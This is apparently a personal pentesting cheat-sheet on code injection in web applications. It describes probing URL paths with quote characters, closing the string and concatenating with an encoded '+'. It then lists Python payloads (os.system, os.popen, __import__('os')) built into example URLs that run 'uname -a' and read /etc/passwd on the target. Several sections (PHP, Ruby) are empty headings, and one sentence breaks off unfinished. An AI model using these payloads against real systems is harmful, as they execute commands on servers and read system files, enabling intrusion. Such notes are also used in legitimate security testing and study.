# Code injection

Obvious opportunity for CE ( depending on language used to build application) are urls like the following :
example.com/hey/hacker?param=fish

example.com/hey?id=1

However, this can also be less obvious to spot, for example you could have a url like:

example.com/hey/hacker

By putting a " symbol into the url you a can try and break the application using strings + concatenation

example.com/hey/hacker"

By breaking the application you will hopefully learn more about it, you might discover the language it's built with for example.

You should then try to _fix_ the application by trying to close out the block

example.com/hey/hacker""

should fix the issue, and give you an idea of how you can exploit the application. The next step would be attempting to concatonate using + ( although in a url you would need to encode it so + would become %2B )

example.com/hey/hacker"%2B"

Once you have tested for CE and think you can exploit it, it would then be time to try some language specific exploits

## encoding urls

%2B = +

## php application injection

## ruby application injection

## python application injection

A good way to confirm you have an exploitable web application via Code injection is to 

To get Python applications to run code on the underlying system you can use

`os.system('')`
or
`os.popen('').read()`

so for example linux system info  

`os.system('uname -a')`
`os.popen('uname -a').read()`

show passwd file

`os.system('cat /etc/passwd')`
`os.popen('cat /etc/passwd').read`

Potentially you might encounter errors when trying to use the `os` module. This could mean it's not actually installed on your target.
You can work around this via the `__import__` method.

So to exploit via the URL  

`example.com/hey/hacker"%2Bstr(os.system('cat /etc/passwd')`

`example.com/hey/hacker"%2Bstr(__import__('os').system('cat /etc/passwd'))%2B"`
